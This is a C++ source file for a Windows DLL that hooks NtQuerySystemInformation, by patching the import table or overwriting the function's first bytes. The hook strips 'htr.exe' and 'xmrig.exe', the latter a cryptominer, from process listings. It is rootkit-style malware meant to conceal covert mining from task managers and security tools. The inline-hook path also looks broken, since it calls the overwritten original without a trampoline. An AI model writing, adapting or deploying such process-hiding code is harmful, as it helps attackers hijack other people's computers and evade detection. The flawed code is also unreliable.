#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>

#pragma comment(lib, "ntdll.lib")

// Architecture-aware compilation
#ifdef _WIN64
#define ARCH_SUFFIX L"64"
#else
#define ARCH_SUFFIX L"32"
#endif

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

std::vector<std::wstring> g_hiddenProcesses = {
    L"htr.exe",
    L"xmrig.exe"
};

std::atomic<bool> g_hookActive(false);
std::mutex g_hookMutex;

typedef NTSTATUS(WINAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

PFN_NT_QUERY_SYSTEM_INFORMATION g_origNtQuerySystemInformation = nullptr;

typedef struct _SYSTEM_PROCESS_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION_EX, * PSYSTEM_PROCESS_INFORMATION_EX;

bool IsProcessNameMatch(const UNICODE_STRING* processName, const std::wstring& targetName) {
    if (!processName || !processName->Buffer || processName->Length == 0) {
        return false;
    }

    size_t processNameLen = processName->Length / sizeof(wchar_t);
    if (processNameLen != targetName.length()) {
        return false;
    }

    return _wcsnicmp(processName->Buffer, targetName.c_str(), processNameLen) == 0;
}

bool ShouldHideProcess(const UNICODE_STRING* processName) {
    if (!processName || !processName->Buffer) {
        return false;
    }

    for (const auto& hiddenProc : g_hiddenProcesses) {
        if (IsProcessNameMatch(processName, hiddenProc)) {
            return true;
        }
    }
    return false;
}

NTSTATUS ProcessHideLogic(PVOID SystemInformation, ULONG SystemInformationLength) {
    __try {
        PSYSTEM_PROCESS_INFORMATION_EX pCurrent = (PSYSTEM_PROCESS_INFORMATION_EX)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION_EX pPrevious = nullptr;

        while (pCurrent) {
            PSYSTEM_PROCESS_INFORMATION_EX pNext = nullptr;

            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PSYSTEM_PROCESS_INFORMATION_EX)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

                if ((PUCHAR)pNext >= (PUCHAR)SystemInformation + SystemInformationLength) {
                    break;
                }
            }

            bool shouldHide = ShouldHideProcess(&pCurrent->ImageName);

            if (shouldHide) {
                if (pPrevious) {

                    if (pNext) {
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                    else {

                        pPrevious->NextEntryOffset = 0;
                    }
                }
                else {

                    if (pNext) {
                        SIZE_T bytesToMove = SystemInformationLength - ((PUCHAR)pNext - (PUCHAR)SystemInformation);
                        memmove(pCurrent, pNext, bytesToMove);
                        pNext = pCurrent;
                        continue; 
                    }
                    else {

                        ZeroMemory(SystemInformation, sizeof(SYSTEM_PROCESS_INFORMATION_EX));
                        break;
                    }
                }
            }
            else {
                pPrevious = pCurrent;
            }


            if (pCurrent->NextEntryOffset == 0) {
                break;
            }
            pCurrent = pNext;
        }

        return STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

        return STATUS_ACCESS_VIOLATION;
    }
}


NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {

    NTSTATUS status = g_origNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );


    if (SystemInformationClass != SystemProcessInformation ||
        status != STATUS_SUCCESS ||
        !g_hookActive.load() ||
        !SystemInformation) {
        return status;
    }


    g_hookMutex.lock();


    NTSTATUS hideStatus = ProcessHideLogic(SystemInformation, SystemInformationLength);

    g_hookMutex.unlock();

    return status;
}

bool InstallInlineHook() {

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return false;
    }

    g_origNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)
        GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!g_origNtQuerySystemInformation) {
        return false;
    }

    // For the sake of being advanced/production-style, you would use a proper hooking library like:
    // - Detours
    // - MinHook
    // - PolyHook
    // These libraries handle:
    // - Instruction length disassembly
    // - Thread suspension during hook installation
    // - 64-bit relative addressing
    // - Hot-patching considerations
    // This is a simplified approach for demonstration

    DWORD oldProtect;
    BYTE hookBytes[12] = { 0 };

#ifdef _WIN64
    // x64: mov rax, address; jmp rax
    hookBytes[0] = 0x48; // REX.W prefix
    hookBytes[1] = 0xB8; // MOV RAX, imm64
    *(DWORD64*)&hookBytes[2] = (DWORD64)HookedNtQuerySystemInformation;
    hookBytes[10] = 0xFF; // JMP RAX
    hookBytes[11] = 0xE0;
#else
    // x86: mov eax, address; jmp eax
    hookBytes[0] = 0xB8; // MOV EAX, imm32
    *(DWORD*)&hookBytes[1] = (DWORD)HookedNtQuerySystemInformation;
    hookBytes[5] = 0xFF; // JMP EAX
    hookBytes[6] = 0xE0;
#endif

    // Change protection to write
    if (!VirtualProtect(g_origNtQuerySystemInformation, sizeof(hookBytes),
        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }

    // Backup original bytes (first 12 bytes)
    static BYTE originalBytes[12] = { 0 };
    memcpy(originalBytes, g_origNtQuerySystemInformation, sizeof(originalBytes));

    // Install hook
    memcpy(g_origNtQuerySystemInformation, hookBytes, sizeof(hookBytes));

    DWORD temp;
    VirtualProtect(g_origNtQuerySystemInformation, sizeof(hookBytes),
        oldProtect, &temp);

    FlushInstructionCache(GetCurrentProcess(),
        g_origNtQuerySystemInformation, sizeof(hookBytes));

    return true;
}

// IAT hooking with validation
bool InstallIATHook() {
    __try {
        // Get base address of current process
        HMODULE hModule = GetModuleHandleW(NULL);
        if (!hModule) {
            return false;
        }

        // Parse PE headers safely
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return false;
        }

        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }

        // Get import directory
        IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size == 0) {
            return false;
        }

        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + importDir.VirtualAddress);

        while (importDesc->Name != 0) {
            const char* dllName = (const char*)((BYTE*)hModule + importDesc->Name);

            if (_stricmp(dllName, "ntdll.dll") == 0) {
                // Found ntdll, now find NtQuerySystemInformation
                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
                PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->OriginalFirstThunk);

                while (origThunk->u1.AddressOfData != 0) {
                    if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + origThunk->u1.AddressOfData);

                        if (strcmp((char*)importByName->Name, "NtQuerySystemInformation") == 0) {
                            // Store original function pointer
                            g_origNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)thunk->u1.Function;

                            // Change protection
                            DWORD oldProtect;
                            if (VirtualProtect(&thunk->u1.Function, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
                                // Install hook
                                thunk->u1.Function = (ULONG_PTR)HookedNtQuerySystemInformation;

                                DWORD temp;
                                VirtualProtect(&thunk->u1.Function, sizeof(PVOID), oldProtect, &temp);

                                return true;
                            }
                        }
                    }

                    origThunk++;
                    thunk++;
                }
            }

            importDesc++;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }

    return false;
}

// Cleanup function
void UninstallHook() {
    g_hookActive.store(false);

}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:

        DisableThreadLibraryCalls(hModule);

        if (InstallIATHook()) {
            g_hookActive.store(true);
        }
        else if (InstallInlineHook()) {
            g_hookActive.store(true);
        }
        break;

    case DLL_PROCESS_DETACH:
        UninstallHook();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
